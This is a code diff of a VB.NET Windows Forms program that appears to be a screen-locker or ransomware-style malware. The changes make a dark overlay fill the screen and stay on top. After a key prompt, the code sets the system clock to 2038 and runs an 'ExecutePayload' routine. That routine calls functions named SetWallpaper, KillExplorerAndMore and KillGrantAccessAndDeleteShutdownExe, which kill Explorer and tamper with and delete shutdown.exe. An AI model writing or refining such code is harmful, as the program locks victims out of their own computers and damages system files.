@@ -180,8 +180,6 @@ Public Class Form1
         Dim flashBrush As New SolidBrush(flashColor)
 
         g.FillRectangle(flashBrush, ClientRectangle)
-        Thread.Sleep(50)
-        Invalidate() ' Clear the flash effect
     End Sub
 
     Public Class FullScreenOverlay
@@ -200,6 +198,12 @@ Public Class Form1
             TopMost = True
             BackColor = Color.Black
             Opacity = 0.7 ' Transparency setting
+            ' Set form properties for full screen
+            WindowState = FormWindowState.Maximized
+            TopMost = True ' Keeps form on top of other windows
+
+            ' Cover all screens if multi-screen is needed
+            Bounds = Screen.FromControl(Me).Bounds
 
             ' Initialize and display the timer label
             timerLabel.AutoSize = True
@@ -1341,24 +1345,9 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
-            ' Execute remaining operations with individual Try...Catch blocks
-            Try
-                SetWallpaper()
-            Catch ex As Exception
-                ' Log or handle exception for SetWallpaper
-                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-            End Try
+            '3. Start the operations
+            ExecutePayload()
 
-            Try
-                KillExplorerAndMore()
-            Catch ex As Exception
-                ' Log or handle exception for KillExplorerAndMore
-                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
-            End Try
-
-            ' Start the operations in a new thread
-            Dim thread As New Thread(AddressOf ExecutePayload)
-            thread.Start()
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
@@ -1401,6 +1390,21 @@ Public Class Form1
     Private Sub ExecutePayload()
 
         Try
+
+            ' Execute remaining operations with individual Try...Catch blocks
+            Try
+                SetWallpaper()
+            Catch ex As Exception
+                ' Log or handle exception for SetWallpaper
+                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+            End Try
+
+            Try
+                KillExplorerAndMore()
+            Catch ex As Exception
+                ' Log or handle exception for KillExplorerAndMore
+                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+            End Try
 
             Try
                 KillGrantAccessAndDeleteShutdownExe()
